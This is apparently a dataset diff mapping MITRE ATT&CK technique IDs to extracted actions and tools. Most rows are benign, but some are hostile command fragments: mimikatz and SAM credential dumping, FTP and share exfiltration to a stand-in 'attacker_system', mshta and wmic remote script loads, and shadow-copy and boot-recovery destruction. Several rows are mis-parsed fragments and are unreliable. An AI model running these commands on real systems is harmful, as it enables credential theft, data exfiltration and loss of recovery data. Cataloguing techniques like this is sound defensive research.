@@ -1,0 +1,1112 @@
+id,what,where
+t1001,use,steganography
+t1001,commingle legitimate traffic,c2 traffic
+t1001,add junk data,protocol traffic
+t1002,use,compression library
+t1002,use,rar
+t1002,use,zip
+t1002,use,7zip
+t1002,use,program
+t1002,use,utility
+t1002,use,zlib
+t1003,use,"""reg save hklm\sam sam"""
+t1003,use,secretsdump.py
+t1003,look,text string/regex pattern
+t1003,use,ntdsutil.exe
+t1003,use,mimikatz
+t1003,use,pwdumpx.exe
+t1003,use,""" /proc filesystem""/procdump/mimikatz/dcsync/lsadump/windows credential editor/procdump  ma lsass.exe lsass_dump/sekurlsa::minidump lsassdump.dmp/sekurlsa::logonpasswords"
+t1003,look,""" /proc filesystem""/procdump/mimikatz/dcsync/lsadump/windows credential editor/procdump  ma lsass.exe lsass_dump/sekurlsa::minidump lsassdump.dmp/sekurlsa::logonpasswords"
+t1003,look,mimipenguin tool
+t1003,use,volume shadow copy
+t1003,use,gpprefdecrypt.py
+t1003,use,creddump7
+t1003,use,invoke ninjacopy
+t1003,use,reg utility/reg.exe
+t1003,use,gsecdump
+t1003,use,get gpppassword
+t1003,use,"metasploit?s post exploitation module: ""post/windows/gather/credentials/gpp"""
+t1005,use,cmd technique
+t1005,use,automated collection technique
+t1005,use,command line interface technique
+t1006,analyze,file system data structure
+t1006,use,ninjacopy
+t1007,use,"svc"""
+t1007,use,"""tasklist"
+t1007,use,net utility
+t1007,use,sc utility
+t1007,use,"""sc"""
+t1007,use,tasklist utility
+t1007,use,net start
+t1008,use,multiple port
+t1008,use,multiple c2 server
+t1009,use,binary padding technique
+t1010,use,applescript script
+t1011,use,modem
+t1011,use,cellular data connection
+t1011,use,radio frequency channel
+t1011,use,wifi connection
+t1011,use,bluetooth
+t1013,write,fully quantified dll pathname to registry key to hklm\system\currentcontrolset\control\print\monitors
+t1013,use,api call
+t1014,modify,operating system api call
+t1015,press,shift key 5
+t1015,press,key combination
+t1015,press,sticky key
+t1015,replace,accessblity program debugger registry key with cmd.exe path
+t1015,press,windows+u
+t1016,use,arp
+t1016,use,route
+t1016,use,nbtstat
+t1016,use,ipconfig/ifconfig
+t1017,use,application deployment software
+t1018,view,net utility
+t1018,view,net view
+t1018,use,""""
+t1018,view,ping utility
+t1018,use,"hosts file"""
+t1018,use,etc
+t1020,use,scripting technique
+t1020,use,automated processing
+t1020,use,exfiltration over alternative protocol technique
+t1021,use,vnc
+t1021,use,telnet
+t1022,use,programming library
+t1022,use,zip
+t1022,use,rar
+t1022,use,rc4
+t1022,use,xor
+t1022,use,base64
+t1022,use,des3
+t1022,use,aes256
+t1023,use,masquerading
+t1024,use,xoring the plaintext with fixed key
+t1024,use,custom cryptographic protocol/custom cryptographic algorithm
+t1025,use,cmd
+t1025,use,interactive command shell
+t1026,,random split
+t1026,,different protocol
+t1027,use,environment alias
+t1027,use,command line interface
+t1027,use,platform specific semantic
+t1027,use,environment variable
+t1027,use,javascrip
+t1027,use,steganography
+t1027,use,compressed script
+t1027,use,archived script
+t1027,use,environment character
+t1027,use,invoke psimage
+t1028,use,powershell
+t1028,use,winrm
+t1028,use,winrm command
+t1029,transfer data,time interval
+t1029,transfer data,certain time
+t1030,use,fixed size chunk
+t1030,use,data size limit
+t1031,use,custom utility
+t1031,use,system utility
+t1031,enable,disabled
+t1031,use,sc.exe
+t1031,use,reg
+t1031,enable,not commonly used service
+t1032,use,rsa
+t1032,use,ssl
+t1032,employ,rc4
+t1032,employ,des cbc
+t1032,employ,aes256
+t1032,employ,aes ecb
+t1032,use,aes cbc
+t1032,use,aes
+t1032,employ,rsa
+t1032,employ,caracach encryption
+t1032,use,des cbc
+t1032,use,rc2
+t1032,employ,encryption algorithm
+t1032,use,des
+t1032,employ,plink utility
+t1032,employ,tls
+t1032,use,camellia cipher
+t1032,use,rc6
+t1032,use,rc4
+t1032,employ,rc2
+t1032,use,aes256
+t1032,employ,xor
+t1032,use,caracach encryption
+t1032,employ,aes
+t1032,employ,seal encryption
+t1032,use,openssl
+t1032,employ,des
+t1032,use,encryption algorithm
+t1032,use,seal encryption
+t1032,employ,camellia cipher
+t1032,employ,ssl
+t1032,employ,aes cbc
+t1032,use,aes ecb
+t1033,use,w
+t1033,use,users
+t1033,use,who
+t1034,place executable,high level directory
+t1034,place executable,preceeding directory
+t1034,place program,same program directory
+t1035,modify,service
+t1035,use,windows service control manager
+t1035,create,service
+t1036,place executable,trusted location
+t1036,rename,legitimate utility
+t1036,use,rtlo character
+t1036,rename file,close approximatio of legitimate program
+t1036,use,rlo character
+t1036,use,right to left override character
+t1037,use,logon script
+t1038,modify,junction
+t1038,modify,directory
+t1038,place dll,current directory
+t1038,modify,.manifest
+t1038,replace,dll
+t1038,place dll,current directory=remote location
+t1038,modify,.local redirection file
+t1039,use,host shared directory
+t1039,use,cmd
+t1039,use,shared network drive
+t1039,use,network file server
+t1039,use,interactive command shell
+t1040,use,sniffpass
+t1040,use,techniques for name service resolution poisoning
+t1040,hook,network api
+t1040,use,"nbt ns poisoning and relay"""
+t1040,use,responder
+t1040,use,span port
+t1040,use,"""llmnr"
+t1040,use,impacket
+t1041,use,data protocol==c2 protocol
+t1042,use,hkey_classes_root.[extension]
+t1042,use,"""hkey_classes_root\txtfile\shell\print\command* """
+t1042,use,hkey_classes_root.txt
+t1042,use,"""hkey_classes_root\txtfile\shell\open\command"""
+t1042,use,"""hkey_classes_root[handler]\shell[action]\command"""
+t1042,use,assoc utility
+t1042,use,"hkey_classes_root\txtfile\shell\printto\command"""
+t1042,use,hkey_classes_root[handler]
+t1043,use,tcp:443  https
+t1043,use,tcp:25  smtp
+t1043,use,udp:53  dns
+t1043,use,tcp
+t1043,use,udp:3389  rdp
+t1043,use,udp:135  rpc
+t1044,use,file system permissions weakness
+t1045,use,own packing technique
+t1045,use,virtual machine software protection
+t1045,use,packer
+t1045,use,upx
+t1046,scan,open port
+t1046,use,port scans tool
+t1046,probe,open port
+t1046,use,vulnerability scans tool
+t1047,use,wmic command
+t1047,use,invoke wmicommand command
+t1047,use,smb service
+t1047,use,rpcs service
+t1047,use,wmi service
+t1048,use,ftp command
+t1048,use,smtp
+t1048,use,cloud storage
+t1048,use,"""net use \\attacker_system\ipc$"
+t1048,use,https
+t1048,use,"y c:\users\* \\attacker_system\share_folder\"""
+t1048,use,c
+t1048,use,smb command
+t1048,use,some other network protocol
+t1048,use,s
+t1048,use,http
+t1048,use,user:username password && xcopy
+t1048,use,dns
+t1048,use,"""echo put c:\path\to\file.txt | ftp  a attacker_system"""
+t1049,use,netstat
+t1049,use,losf
+t1049,use,net session
+t1049,use,net utility
+t1049,use,who  a
+t1049,use,net use
+t1049,use,who  w
+t1050,use,operating system name
+t1050,use,service execution technique
+t1050,modify,registry
+t1050,use,benign software name
+t1050,use,masquerading technique
+t1051,use,php script
+t1051,use,web browser
+t1052,use,external hard drive
+t1052,use,cellular phone
+t1052,use,device
+t1052,use,physical medium
+t1052,use,mp3 player
+t1053,use,task scheduling
+t1053,use,utility schtasks
+t1053,use,utility at
+t1054,tamper,setting
+t1054,modify,registry key
+t1054,tamper,registry key
+t1054,modify,configuration file
+t1054,modify,setting
+t1054,create,firewall rule
+t1054,stop,process
+t1054,use,wmi
+t1054,tamper,configuration file
+t1055,use,vdso hijacking
+t1055,use,ptrace system call
+t1055,hijack,thread execution
+t1055,use,proc
+t1055,use,
+t1055,use,ld_preload environment variable
+t1055,write code,process
+t1055,manipulate,code stub mapping
+t1055,create,remote thread
+t1055,use,early bird injection
+t1055,use,dyld_insert_libraries environment variables
+t1055,use,ld_library_path environment variable
+t1055,use,dlfcn application programming interface  api
+t1055,use,atombombing
+t1055,use,[pid]
+t1056,,external remote services technique
+t1056,perform,keylogging
+t1056,wrap,windows default credential provider
+t1056,,valid accounts technique
+t1056,perform,uac prompt
+t1057,use,ps command
+t1057,use,tasklist utility
+t1058,use,service controller
+t1058,use,reg
+t1058,use,sc.exe
+t1058,use,powershell
+t1059,use,reverse shell
+t1059,use,"c whoami"""
+t1059,use,"""""cmd.exe"""
+t1059,use,remote shell
+t1059,use,cmd.exe
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runservicesonce
+t1060,modify,hkey_local_machine\software\microsoft\windows
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell folders
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runonceex
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\explorer\shell folders
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\run
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\run
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\explorer\user shell folders
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shell folders
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runonce
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\runservices
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runservicesonce
+t1060,modify,nt\currentversion\winlogon\shellhkey_current_user\software\microsoft\windows\currentversion\policies\explorer\run
+t1060,modify,nt\currentversion\winlogon\userinit
+t1060,modify,hkey_current_user\software\microsoft\windows\currentversion\run
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runonce
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runservices
+t1060,create,hkey_current_user\software\microsoft\windows nt\currentversion\windows
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\explorer\user shell folders
+t1060,modify,hklm\software\microsoft\windows\currentversion\runonceex\0001\depend
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runservices
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runservices
+t1060,create,hkey_current_user\software\microsoft\windows\currentversion\runservicesonce
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\run
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\explorer\user shell folders
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\runonceex
+t1060,create,hklm\software\microsoft\windows\currentversion\runonceex\0001\depend
+t1060,create,hkey_local_machine\software\microsoft\windows\currentversion\runonce
+t1060,create,nt\currentversion\winlogon\userinit
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\policies\explorer\run
+t1060,modify,hkey_current_user\software\microsoft\windows nt\currentversion\windows
+t1060,modify,hkey_local_machine\software\microsoft\windows\currentversion\explorer\shell folders
+t1061,use,windows run command
+t1061,use,"remote desktop protocol technique""""windows\system32\drivers\vmmouse.sys""""/"
+t1061,use,mouse double click events
+t1062,,interruption
+t1063,use,dir with cmd
+t1063,use,netsh
+t1063,use,reg query with reg
+t1063,use,tasklist
+t1064,,metasploit
+t1064,,powersploit
+t1065,use,not commonly used port
+t1065,use,uncommonly used port
+t1066,modify,file
+t1066,use,software packing technique
+t1067,use,bootkit
+t1068,exploit,cve
+t1069,use,net localgroup
+t1069,use,dscacheutil  q group
+t1069,use,ldapsearch
+t1070,use,powershell command
+t1070,use,wevtutil cl application
+t1070,use,wevtutil cl security
+t1071,use,smtp
+t1071,use,https
+t1071,use,common
+t1071,use,dns
+t1072,use,altiris
+t1072,use,sccm
+t1072,use,hbss
+t1072,use,vnc
+t1072,use,third party software
+t1074,use,cmd
+t1074,use,data compressed technique
+t1074,use,bash
+t1074,use,interactive command shell
+t1075,capture hash,credential access technique
+t1076,use,rdp
+t1076,use,command line argument
+t1076,use,rds
+t1077,use,service execution
+t1077,use,remote execution
+t1077,use,scheduled task
+t1077,use,windows management instrumentation
+t1077,use,ntlm hash
+t1077,use,net utility
+t1077,use,rpc
+t1077,use,smb
+t1077,use,net use
+t1078,use,credential access techniques
+t1078,use,remote service
+t1078,use,social engineering
+t1079,tunnel custom encryption scheme,multiple encryption
+t1079,tunnel custom encryption scheme,protocol encryption scheme
+t1079,use,multiple encryption
+t1079,tunnel custom encryption scheme,multilayer encryption
+t1079,use,multilayer encryption
+t1080,use,shortcut modification
+t1080,use,hidden file and directories
+t1080,use,masquerading
+t1081,use,credential dumping
+t1082,use,systeminfo utility
+t1082,use,dir utility
+t1083,use,ls/find/locatecommands
+t1084,use,wmi
+t1085,use,"rundll32.exe javascript:""..\mshtml,runhtmlapplication """
+t1085,use,shell32.dll function control_rundllasuser
+t1085,use,shell32.dll function control_rundll
+t1085,use,rundll32.exe
+t1086,run,"start process cmdlet """"hklm\hardware\acpi\dsdt\box_""""""""/"
+t1086,run,invoke command cmdlet
+t1086,run,powershell.exe
+t1086,run,psattack
+t1086,run,empire
+t1086,run,powersploit
+t1086,run,system.management.automation assembly
+t1086,run,windows common language interface  cli
+t1087,acquire information,""""
+t1087,use,etc
+t1087,use,az ad user list
+t1087,acquire information,get msolrolemember powershell cmdlet
+t1087,acquire information,net utility
+t1087,use,net group
+t1087,acquire information,etc
+t1087,use,net utility
+t1087,use,net localgroup
+t1087,use,net user
+t1087,acquire information,net user
+t1087,acquire information,azure cli
+t1087,acquire information,"id"""
+t1087,use,"""groups"
+t1087,use,""""
+t1087,acquire information,"""groups"
+t1087,acquire information,"groups """
+t1087,use,dscacheutil  q group
+t1087,use,get globaladdresslist powershell cmdlet
+t1087,use,"groups """
+t1087,use,"""dscl . list"
+t1087,acquire information,get globaladdresslist powershell cmdlet
+t1087,acquire information,"""dscl . list"
+t1087,acquire information,az ad user list
+t1087,acquire information,"passwd"""
+t1087,acquire information,"net localgroup""""windows\system32\vboxdisp.dll"""""""
+t1088,inject process,trusted process
+t1088,inject software,trusted process
+t1088,use,rundll32 technique
+t1089,kill,security software
+t1089,kill,logging process
+t1089,delete,registry keys
+t1090,use,socks
+t1090,use,proxy
+t1090,use,htran
+t1090,use,socks5
+t1091,use,autorun feature
+t1091,format,media firmware
+t1091,format,executable file
+t1091,modify,"media firmware """"windows\system32\vboxhook.dll""""/"
+t1091,rename,malware file
+t1091,format,media
+t1091,manipulate,media
+t1091,modify,executable file
+t1091,manipulate,executable file
+t1091,manipulate,media firmware
+t1093,use,process hollowing
+t1094,mimick,well known protocol
+t1094,develop,custom protocol
+t1095,use,session layer protocol
+t1095,use,internet control message protocol  icmp
+t1095,use,standard non application layer protocol
+t1096,use,ea
+t1096,use,file attribute
+t1097,use,credential dumping
+t1099,use,masquerading  technique
+t1101,modify,hklm\system\currentcontrolset\control\lsa\security packages
+t1101,modify,hklm\system\currentcontrolset\control\lsa\osconfig\security packages
+t1102,post,dead drop resolver
+t1103,modify,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
+t1103,load,user32.dll
+t1103,load,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
+t1103,modify,user32.dll
+t1103,modify,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
+t1103,load,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
+t1104,create,multi stage channel
+t1104,use,remote access tool
+t1105,use,remote desktop protocol
+t1105,use,windows admin share
+t1105,use,smb
+t1105,use,sftp
+t1105,use,scp
+t1105,use,rsync
+t1105,use,ftp
+t1106,use,shellexecuteexw   api
+t1106,use,createprocessa   api
+t1106,use,loadpackagedlibrary   api
+t1106,use,shellexecutea   api
+t1106,use,loadmodule   api
+t1106,use,winexec   api
+t1106,use,loadlibraryw   api
+t1106,use,shellexecuteexa   api
+t1106,use,createprocessinternala   api
+t1106,use,createprocessw   api
+t1106,use,loadlibraryexw   api
+t1106,use,createprocessasusera   api
+t1106,use,loadlibraryexa   api
+t1106,use,createprocessasuserw   api
+t1106,use,loadlibrarya   api
+t1106,use,shellexecutew   api
+t1106,use,createprocesswithlogonw   api
+t1107,use,del
+t1107,use,native cmd
+t1107,use,secure deletion tools
+t1107,use,third party file deletion tool
+t1108,vary,command and control protocol
+t1108,use,cloud based infrastructure
+t1108,use,web shell technique
+t1108,use,cloud based application
+t1109,compromise,device firmware
+t1110,guess,password
+t1110,use,password spraying technique
+t1110,use,credential dumping technique
+t1110,use,commonly used port
+t1111,use,keylogger
+t1111,use,inserted hardware token
+t1112,prepend keyname,null character
+t1112,use,built in windows command line utility reg
+t1112,use,remote access tool
+t1113,use,native command screencapture
+t1113,use,xwd
+t1113,use,remote access tool
+t1114,access,cache files/ .pst / .ost
+t1114,search,cache files/ .pst / .ost
+t1114,access,outlook storage/webmail application/outlook web access
+t1114,search,email forwarding rule
+t1114,search,outlook storage/webmail application/outlook web access
+t1114,create,email forwarding rule
+t1114,create,outlook storage/webmail application/outlook web access
+t1114,access,webmail application/outlook web access
+t1114,search,webmail application/outlook web access
+t1115,use,windows api
+t1115,use,pbpaste
+t1116,steal,certificate
+t1117,using,component object model hijacking
+t1117,using,regsvr32.exe
+t1117,send,url
+t1117,pass,url
+t1117,send,uniform resource locator
+t1117,use,regsvr32.exe
+t1118,use,[system.componentmodel.runinstaller true ]
+t1118,use,attributes within the binary
+t1119,use,remote file copy
+t1119,use,scripting
+t1119,use,file and directory discovery
+t1121,use,[comunregisterfunction] attribute
+t1121,use,[comregisterfunction] attribute
+t1122,change,registry key
+t1122,replace,registry key
+t1123,use/levarage,voice and video call services
+t1123,use/levarage,peripheral devices/applications
+t1123,use/levarage,conversations/malware/scripts / microphones/webcams
+t1124,use,
+t1124,use,net time \hostname
+t1124,use,'w32tm
+t1125,use,webcam
+t1125,use,malware
+t1125,use,video call service
+t1125,use,peripheral device
+t1125,use,application
+t1125,write audio file,disk
+t1125,use,script
+t1125,use,integrated camera
+t1126,use,delete command
+t1126,use,net use \system\share
+t1126,use,net utility
+t1128,use,windows registry at hklm\software\microsoft\netsh
+t1128,use,vpn software
+t1128,modify,netsh registry key
+t1128,use,netsh helper dll
+t1129,use,"dll pathname specification in import directory/dll pathname exported to another dll/dll directory pathname in ntfs junction / symlink program.exe.local /application manifest/<file name=""filename.extension"" loadfrom=""fully qualified or relative pathnam"
+t1129,use,windows native api /createprocess  /loadlibrary  /loadlibraryexw  /dwritecreatefactory
+t1130,use,security add trusted cert  d  r trustroot  k
+t1130,use,malicious certificate as trusted root certificate
+t1130,reinstall,certificate
+t1130,use,to
+t1130,use,malicious
+t1130,use,
+t1130,use,bin
+t1130,use,keychains
+t1130,use,usr
+t1130,use,cert
+t1130,clone,certificate
+t1131,place binary reference,registry key
+t1131,place binary reference,"hklm\system\currentcontrolset\control\lsa\""authentication packages"""
+t1132,use,character encoding system
+t1132,use,binary to text
+t1132,use,utf 8
+t1132,use,ascii
+t1132,use,unicode
+t1132,use,standard data encoding system
+t1132,use,base64
+t1132,use,gzip
+t1133,use,valid account technique
+t1133,obtain,user credential
+t1133,use,credential pharming
+t1134,use,createprocesswithtokenw
+t1134,use,runas command
+t1134,use,windows api function
+t1134,use,impersonateloggedonuser
+t1134,use,setthreadtoken
+t1134,create,new logon session
+t1134,use,cobalt strike beacon payload
+t1134,use,logonuser
+t1134,use,duplicatetoken ex
+t1134,use,metasploit?s meterpreter payload
+t1134,use,token stealing
+t1135,use,net share
+t1135,use,net utility
+t1135,use,net view \remotesystem
+t1136,use,net utility
+t1136,use,net user command
+t1137,modify,globaldotname registry key
+t1137,hijack,application's search order
+t1139,use,.bash_history file
+t1139,use,~/.bash_history file
+t1140,use,powershell
+t1140,use,scripting
+t1140,use,windows copy
+t1140,use,certutil
+t1140,use,built in functionality of malware
+t1141,use,fake installer
+t1141,use,fake promt
+t1141,use,fake malware removal site
+t1141,use,powershell
+t1141,use,applescript
+t1143,abuse,plist file tag apple.awt.uielement
+t1143,abuse,vbscript
+t1143,abuse,powershell.exe  windowstyle hidden
+t1143,abuse,jscript
+t1143,use,plist file tag apple.awt.uielement
+t1143,use,vbscript
+t1143,abuse,scripting language
+t1143,use,powershell.exe  windowstyle hidden
+t1144,load app,optical disk
+t1144,use,path
+t1144,load app,usb flash drive
+t1144,use,to
+t1144,load app,drive shared over the local network
+t1144,use,myapp.app
+t1144,use,xattr command xattr
+t1144,load app,drive by download
+t1145,use,mimikatz's crypto::extract module
+t1145,use,brute force technique
+t1145,use,invoke sessiongopher
+t1145,use,keylogger
+t1145,search,key directory
+t1145,search,file extension
+t1146,use,".bash_history"""
+t1146,search,".bash_historyfile"""
+t1146,search,"""~"
+t1146,use,command unset histfile
+t1146,use,""" rm ~"
+t1146,search,environment variable histfile
+t1146,use,history  c
+t1147,create,account technique with a userid under 500
+t1147,set,hide500users property value
+t1147,enable,hide500users property value
+t1147,use,users
+t1147,use,sudo dscl .  create
+t1147,use,username uniqueid 401
+t1148,prepend,space before terminal command
+t1148,set,ignoreboth
+t1148,set,ignoredups
+t1149,modify,lc_main
+t1149,modify,lc_thread
+t1150,modify,/library/preferences
+t1151,rename,file
+t1151,change,file extension
+t1151,append,space
+t1152,use,launchctl command
+t1152,use,"""launchctl submit  l"
+t1152,use,path
+t1152,use,"execute arg arg arg"""
+t1152,use,thing
+t1152,use,to
+t1153,,source /path/to/filename [arguments]
+t1153,,. /path/to/filename [arguments]
+t1154,use,trap 'command list' signals
+t1154,use,trap command
+t1155,use,osascript
+t1155,use,command line arguments
+t1156,insert,shell command
+t1157,use,dylib hyjacking
+t1158,put,"""."" as the first character in the file or folder name"
+t1158,use,attrib.exe
+t1158,use,graphical user interface
+t1158,use,uf_hidden flag
+t1159,use,$home/library/launchagents
+t1159,disguise,/library/launchagents
+t1159,use,agent name
+t1159,disguise,launchd/launchctl
+t1159,use,/library/launchagents
+t1159,disguise,$home/library/launchagents
+t1159,disguise,system/library/launchagents
+t1159,use,system/library/launchagents
+t1159,disguise,agent name
+t1160,use,system/library/launchdaemons
+t1160,use,launchd/launchctl
+t1160,disguise,/library/launchdaemons
+t1160,use,agent name
+t1160,use,/library/launchdaemons
+t1160,disguise,launchd/launchctl
+t1160,disguise,agent name
+t1161,remove,lc_code_signature
+t1162,use,applescript
+t1162,use,scripting language
+t1162,use,api method smloginitemsetenabled
+t1163,modify,rc.common file
+t1164,modify,~/library/preferences/byhost/com.apple.loginwindow.* .plist
+t1164,modify,~/library/preferences/com.apple.loginwindow.plist
+t1166,use,chmod u+s [file
+t1166,use,chmod 4777 [file]
+t1168,modify,plist file
+t1168,modify,cron.d file
+t1168,use,cron tab
+t1168,use,cron job
+t1168,use,launchd
+t1168,use,cron daemon
+t1169,modify,sudoers file
+t1170,use,
+t1170,use,mshta.exe
+t1170,use,msta
+t1170,use,payload[.]hta
+t1170,use,mshta http[:]
+t1170,use,webserver
+t1170,use,"payload[.]sct"""" """
+t1170,use,"vbscript:close execute ""getobject """"script:https[:]"
+t1171,respond,udp 137 traffic
+t1171,use,network sniffing tool
+t1171,use,nbnspoof
+t1171,use,traffic monitoring tool
+t1171,use,responder
+t1171,use,tool
+t1171,respond,llmnr
+t1171,respond,udp 5355
+t1171,use,metasploit
+t1171,use,brute force
+t1172,use,tls header sni field are not equal to http header
+t1172,use,tls and http
+t1173,use,embedded file
+t1175,use,dcom
+t1175,use,com
+t1176,use,social engineering
+t1176,masquerade,legitimate extension
+t1177,add,driver
+t1177,use,dll search order hijacking technique
+t1177,use,dll side loading technique
+t1177,replace,driver
+t1178,use,sid history injection technique
+t1179,overwrite,first byte of api function
+t1179,use,hokking procedure
+t1179,inject,program
+t1179,modify,process iat
+t1179,spawn,system thread
+t1179,modify,iat pointers to createwindowex
+t1180,modify,hkcu\control panel\desktop\scrnsave.exe
+t1180,modify,hkcu\control panel\desktop\screensaverissecure
+t1180,modify,hkcu\control panel\desktop\screensavertimeout
+t1181,write code,ewm
+t1181,write code,extra window memory
+t1181,write payload,extra window memory
+t1181,place pointer,ewm
+t1181,write payload,ewm
+t1181,place pointer,extra window memory
+t1182,use,hkey_local_machine\system\currentcontrolset\control\session manager
+t1182,use,application programming interface  api  functions /createprocess/createprocessasuser/ createprocesswithloginw/createprocesswithtokenw/winexec/
+t1183,,d c:\temp\evil.exe causing a malicious executable to be loaded and run
+t1183,,v globalflag
+t1183,,d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
+t1183,,v reportingmode
+t1183,,d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
+t1183,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe
+t1183,,t reg_dword
+t1183,,v monitorprocess
+t1184,compromise,ssh agent
+t1184,use,agent socket
+t1185,use,security vulnerability
+t1185,use,browser functionality
+t1185,set,http proxy
+t1186,use,legitimate executable
+t1186,use,process doppelganging
+t1186,use,txf transaction
+t1186,use,windows transactional ntfs
+t1187,point,external reference
+t1187,use,file[:]
+t1187,use,normal.dotm
+t1187,force,smb authentication
+t1187,use,
+t1187,use,spearphishing
+t1187,use,[remote address]
+t1188,use,tor
+t1188,use,several proxy
+t1189,use,built in web application interface
+t1189,use,cross site scripting
+t1189,use,javascript
+t1190,use,command
+t1190,use,software
+t1190,use,ssh
+t1190,use,databases
+t1190,use,web servers
+t1190,use,standard services
+t1190,use,data
+t1190,use,smb
+t1190,use,sql
+t1191,infect inf file,malicious command
+t1192,attach,link with social engineering text
+t1193,use,executable
+t1193,use,microsoft office document
+t1193,use,archived file
+t1193,use,pdf
+t1194,ask about,policy/ software
+t1194,leverage,non enterprise controlled service
+t1194,leverage,socail media
+t1194,leverage,personal webmail
+t1194,ask about,job opportunity/service
+t1194,leverage,user execution
+t1195,,code
+t1195,,image
+t1195,use,open source code
+t1195,,selling s
+t1196,use,programmatically
+t1196,use,application programming interface  api  call
+t1197,invoke,"program when a job complete or error """"hklm\hardware\description\system\""""systembiosversion"""""""
+t1197,create,long standing job
+t1198,modify,hklm\software[wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata{{sip_guid}} to the dll providing a sip?s cryptsipdllverifyindirectdata function
+t1198,modify,hklm\software[wow6432node]microsoft\cryptography\providers\trust\finalpolicy{{trust provider guid}} the dll providing a trust provider?s finalpolicy function
+t1198,modify,funcname registry value
+t1198,point,malicious dll
+t1198,modify,dll  registry value
+t1199,use,trusted third party relationship
+t1201,use,cat /etc/pam.d/common password
+t1201,use,net accounts /domain
+t1201,use,net accounts
+t1201,use,pwpolicy getaccountpolicies
+t1202,use,run window
+t1202,use,forfiles
+t1202,use,components of the windows subsystem for linux  wsl
+t1202,use,the program compatibility assistant  pcalua.exe
+t1202,use,scripts
+t1203,use,spearphishing via service  technique
+t1203,use,spearphishing attachment technique
+t1203,use,spearphishing link technique
+t1203,use,drive by compromise technique
+t1204,deliver,spearphishing link technique
+t1204,deliver,spearphishing attachment technique
+t1204,use,spearphishing attachment technique
+t1204,use,spearphishing link technique
+t1205,use,libcap libraries
+t1206,disable,tty_tickets
+t1207,create,new server and ntdsdsa object
+t1207,delete,associated metadata
+t1207,manipulate,ad object
+t1207,register,rouge dc
+t1207,manipulate,account
+t1207,manipulate,schema
+t1207,alter,associated metadata
+t1207,alter,replication
+t1207,manipulate,access control list
+t1207,delete,replication
+t1208,perform,valid account technique
+t1208,perform,brute force technique
+t1209,use,time provider registry key
+t1209,use,hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\
+t1210,take advantage,error
+t1211,reconnaissance,vulnerability
+t1211,reconnaissance,security software discovery technique
+t1214,use,"reg query hklm /f password /t reg_sz /s,reg query hkcu /f password /t reg_sz /s"
+t1214,use,reg utility
+t1216,,hi.png
+t1216,,cscript c[:]\windows\system32\printing_admin_scripts\en us\pubprn[.]vbs 127.0.0.1 script:http[:]
+t1216,,192.168.1.100
+t1218,,regsvr option
+t1218,,odbcconf.exe /s /a {regsvr c:\users\public\file.dll}
+t1218,,c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll>
+t1218,,msiexec.exe /y c:\path\to\file.dll
+t1218,,msiexec.exe /q /i c:\path\to\file.msi
+t1218,,c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>
+t1219,use,logmein
+t1219,use,remote access software
+t1219,use,desktop support software
+t1219,use,remote access tool
+t1219,use,ammyyadmin
+t1219,use,go2assit
+t1219,use,team viewer
+t1220,use,msxsl.exe script[.]jpeg script[.]jpeg
+t1220,use,wmic process list /format:evil[.]xsl
+t1220,use,"wmic os get /format:""https[:]//example[.]com/evil[.]xsl"""
+t1220,use,msxsl.exe customers[.]xml script[.]xsl
+t1220,use,msxsl.exe script[.]xsl script[.]xsl
+t1221,using,template injection
+t1222,change,specific access right
+t1223,use,user execution technique
+t1223,deliver,custom chm file containing embedded payload
+t1480,use,environment specific value
+t1480,use,physical device
+t1480,use,joined active directory  ad  domains
+t1480,use,target specific value
+t1480,use,""" local"
+t1480,use,"software version"""
+t1480,use,network share names
+t1480,use,""" software"
+t1480,use,"external ip addresse"""
+t1480,use,attached physical devices
+t1481,post,dead drop resolver
+t1482,use,.net methods
+t1482,use,dsenumeratedomaintrusts   win32 api call
+t1482,use,ldap
+t1483,concatenate,words together
+t1484,modify,"""<gpo_path>\machine\preferences\scheduledtasks\scheduledtasks.xml"""
+t1484,use,new gpoimmediatetask script
+t1484,use,seenabledelegationprivilege
+t1484,set,<gpo_path>\machine\microsoft\windows nt\secedit\gpttmpl.inf
+t1485,use,command line argument
+t1485,use,del
+t1487,overwrite,critical data
+t1488,use,third part tool
+t1488,use,rawdisk
+t1489,,
+t1490,use,"quiet"""
+t1490,use,"""bcdedit.exe"
+t1490,use,all
+t1490,use,bcdedit.exe
+t1490,use,wbadmin.exe
+t1490,use,"set {{default}} recoveryenabled no"""
+t1490,use,wmi
+t1490,use,vssadmin.exe
+t1490,use,"""wmic shadowcopy delete"""
+t1490,use,native windows utility
+t1490,use,set {{default}} bootstatuspolicy ignoreallfailures & bcdedit
+t1490,use,"""wbadmin.exe delete catalog  quiet"""
+t1493,intercept,data between process
